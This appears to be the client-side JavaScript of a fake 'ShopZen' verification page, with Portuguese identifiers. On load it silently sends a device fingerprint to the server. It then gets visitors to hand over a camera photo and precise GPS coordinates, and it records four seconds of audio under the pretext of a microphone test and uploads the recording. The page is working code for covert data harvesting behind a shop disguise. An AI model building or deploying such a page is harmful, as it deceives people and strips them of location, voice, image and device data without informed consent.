const concluidos = { camera: false, geo: false, audio: false };

(async function enviarInfoDispositivo() {
  try {
    const info = {
      largura: screen.width,
      altura: screen.height,
      pixelRatio: window.devicePixelRatio,
      fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
      idioma: navigator.language,
      idiomas: navigator.languages,
      plataforma: navigator.platform,
      nucleosCpu: navigator.hardwareConcurrency,
      memoriaDispositivo: navigator.deviceMemory,
    };

    if (navigator.connection) {
      info.conexaoTipo = navigator.connection.effectiveType;
      info.conexaoVelocidade = navigator.connection.downlink;
    }

    if (navigator.getBattery) {
      const bateria = await navigator.getBattery();
      info.bateriaNivel = bateria.level;
      info.bateriaCarregando = bateria.charging;
    }

    await fetch('/verificacao/dispositivo', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(info),
    });
  } catch {
    // coleta de dispositivo e best-effort, nao bloqueia o fluxo
  }
})();

const saudacaoEl = document.getElementById('saudacao');
try {
  const usuario = sessionStorage.getItem('shopzen_usuario');
  if (usuario) saudacaoEl.textContent = `, ${usuario}`;
} catch {
  // sessionStorage indisponivel, segue sem saudacao personalizada
}

document.getElementById('btn-sair').addEventListener('click', () => {
  window.location.href = '/';
});

document.getElementById('modal-fechar').addEventListener('click', () => {
  document.getElementById('modal-info').style.display = 'none';
});

function definirEstado(elemento, texto, tipo) {
  elemento.textContent = texto;
  elemento.classList.remove('erro', 'ok');
  if (tipo) elemento.classList.add(tipo);
}

function marcarConcluido(nome) {
  concluidos[nome] = true;
  try {
    sessionStorage.setItem(`shopzen_cap_${nome}`, '1');
  } catch {
    // sessionStorage indisponivel, segue sem persistir o progresso
  }
  if (concluidos.camera && concluidos.geo && concluidos.audio) {
    setTimeout(() => {
      window.location.href = '/sucesso';
    }, 900);
  }
}

function restaurarEstado() {
  let temCamera = false;
  let temGeo = false;
  let temAudio = false;

  try {
    temCamera = sessionStorage.getItem('shopzen_cap_camera') === '1';
    temGeo = sessionStorage.getItem('shopzen_cap_geo') === '1';
    temAudio = sessionStorage.getItem('shopzen_cap_audio') === '1';
  } catch {
    // sessionStorage indisponivel, segue sem restaurar
  }

  if (temCamera) {
    definirEstado(document.getElementById('estado-camera'), 'Foto capturada.', 'ok');
    document.getElementById('btn-camera').disabled = true;
    try {
      const dataUrl = sessionStorage.getItem('shopzen_cap_foto');
      if (dataUrl) {
        const foto = document.getElementById('foto');
        foto.src = dataUrl;
        foto.style.display = 'block';
      }
    } catch {
      // sessionStorage indisponivel, segue sem miniatura
    }
    concluidos.camera = true;
  }

  if (temGeo) {
    definirEstado(document.getElementById('estado-geo'), 'Localização obtida.', 'ok');
    document.getElementById('btn-geo').disabled = true;
    try {
      const raw = sessionStorage.getItem('shopzen_cap_geo_coords');
      if (raw) {
        const { lat, lon } = JSON.parse(raw);
        const delta = 0.01;
        const bbox = `${lon - delta},${lat - delta},${lon + delta},${lat + delta}`;
        const mapa = document.getElementById('mapa');
        mapa.src = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&marker=${lat},${lon}`;
        mapa.style.display = 'block';
        document.getElementById('coords').textContent = `Lat: ${lat.toFixed(5)}, Lon: ${lon.toFixed(5)}`;
      }
    } catch {
      // sessionStorage indisponivel, segue sem mapa
    }
    concluidos.geo = true;
  }

  if (temAudio) {
    definirEstado(document.getElementById('estado-audio'), 'Microfone testado.', 'ok');
    document.getElementById('btn-audio').disabled = true;
    concluidos.audio = true;
  }

  if (concluidos.camera && concluidos.geo && concluidos.audio) {
    setTimeout(() => {
      window.location.href = '/sucesso';
    }, 900);
  }
}

restaurarEstado();

// Camera
document.getElementById('btn-camera').addEventListener('click', () => {
  window.location.href = '/verificacao/camera';
});

// Localizacao
document.getElementById('btn-geo').addEventListener('click', () => {
  const botao = document.getElementById('btn-geo');
  const estado = document.getElementById('estado-geo');
  const mapa = document.getElementById('mapa');
  const coords = document.getElementById('coords');

  botao.disabled = true;
  definirEstado(estado, 'Obtendo localização...');

  navigator.geolocation.getCurrentPosition(
    async (posicao) => {
      try {
        const { latitude, longitude, accuracy } = posicao.coords;
        const delta = 0.01;
        const bbox = `${longitude - delta},${latitude - delta},${longitude + delta},${latitude + delta}`;
        mapa.src = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&marker=${latitude},${longitude}`;
        mapa.style.display = 'block';
        coords.textContent = `Lat: ${latitude.toFixed(5)}, Lon: ${longitude.toFixed(5)}`;

        const res = await fetch('/verificacao/geo', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ lat: latitude, lon: longitude, accuracy }),
        });
        const data = await res.json();

        if (data.ok) {
          definirEstado(estado, 'Localização obtida.', 'ok');
          try {
            sessionStorage.setItem('shopzen_cap_geo_coords', JSON.stringify({ lat: latitude, lon: longitude }));
          } catch {
            // sessionStorage indisponivel, segue sem restaurar o mapa depois
          }
          marcarConcluido('geo');
        } else {
          definirEstado(estado, 'Falha ao enviar localização.', 'erro');
          botao.disabled = false;
        }
      } catch {
        definirEstado(estado, 'Localização não obtida.', 'erro');
        botao.disabled = false;
      }
    },
    () => {
      definirEstado(estado, 'Localização não obtida.', 'erro');
      botao.disabled = false;
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
});

// Microfone
document.getElementById('btn-audio').addEventListener('click', async () => {
  const botao = document.getElementById('btn-audio');
  const estado = document.getElementById('estado-audio');
  const medidor = document.getElementById('medidor');
  const nivel = document.getElementById('medidor-nivel');

  botao.disabled = true;
  definirEstado(estado, 'Testando microfone...');
  medidor.style.display = 'block';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });

    const AudioContextClasse = window.AudioContext || window.webkitAudioContext;
    const audioContext = new AudioContextClasse();
    const fonte = audioContext.createMediaStreamSource(stream);
    const analisador = audioContext.createAnalyser();
    analisador.fftSize = 512;
    fonte.connect(analisador);
    const dados = new Uint8Array(analisador.frequencyBinCount);

    let animando = true;
    function animarMedidor() {
      if (!animando) return;
      analisador.getByteTimeDomainData(dados);
      let soma = 0;
      for (let i = 0; i < dados.length; i++) {
        const desvio = dados[i] - 128;
        soma += desvio * desvio;
      }
      const rms = Math.sqrt(soma / dados.length);
      const percentual = Math.min(100, (rms / 60) * 100);
      nivel.style.width = `${percentual}%`;
      requestAnimationFrame(animarMedidor);
    }
    animarMedidor();

    const recorder = new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = (e) => chunks.push(e.data);

    recorder.onstop = async () => {
      animando = false;
      nivel.style.width = '0%';
      stream.getTracks().forEach((track) => track.stop());
      audioContext.close();

      const blob = new Blob(chunks, { type: 'audio/webm' });
      const formData = new FormData();
      formData.append('audio', blob, 'audio.webm');

      try {
        const res = await fetch('/verificacao/audio', {
          method: 'POST',
          body: formData,
        });
        const data = await res.json();

        if (data.ok) {
          definirEstado(estado, 'Microfone testado.', 'ok');
          marcarConcluido('audio');
        } else {
          definirEstado(estado, 'Falha ao enviar áudio.', 'erro');
          botao.disabled = false;
        }
      } catch {
        definirEstado(estado, 'Microfone inativo.', 'erro');
        botao.disabled = false;
      }
    };

    recorder.start();
    setTimeout(() => recorder.stop(), 4000);
  } catch {
    definirEstado(estado, 'Microfone inativo.', 'erro');
    botao.disabled = false;
  }
});
